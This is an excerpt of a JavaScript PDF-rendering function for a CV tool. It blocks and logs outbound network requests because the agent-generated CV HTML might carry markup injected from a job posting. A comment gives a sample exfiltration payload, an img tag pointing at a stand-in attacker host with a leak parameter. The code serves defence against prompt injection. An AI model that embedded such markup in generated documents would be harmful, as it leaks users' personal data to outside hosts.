...
async function generatePDF() {
  ...
  try {
    ...
    // Render offline. The CV HTML is generated by the agent from the user's CV
    // *and* the job description, so a posting carrying injected markup could
    // otherwise phone home — `<img src="https://attacker/?leak=...">` would be
    // fetched here, and `waitUntil: 'networkidle'` would dutifully wait for it.
    // Fonts are embedded as file:// URLs above, so nothing legitimate needs the
    // network during a render.
    ...
    // NOTE: page.setContent() accepts only { timeout, waitUntil }. The
    // `baseURL` option previously passed here was silently ignored by
    // Playwright — it never resolved relative resources. Font paths are
    // rewritten to absolute file:// URLs above, which is what actually works.
    ...
    if (blockedRequests.length > 0) {
      // Worth surfacing loudly: a CV template should be fully self-contained,
      // so an outbound request usually means injected content made it in.
      const unique = [...new Set(blockedRequests)];
      console.log(`🛡️  Blocked ${blockedRequests.length} outbound request(s) during render:`);
      for (const url of unique.slice(0, 10)) console.log(`     ${url}`);
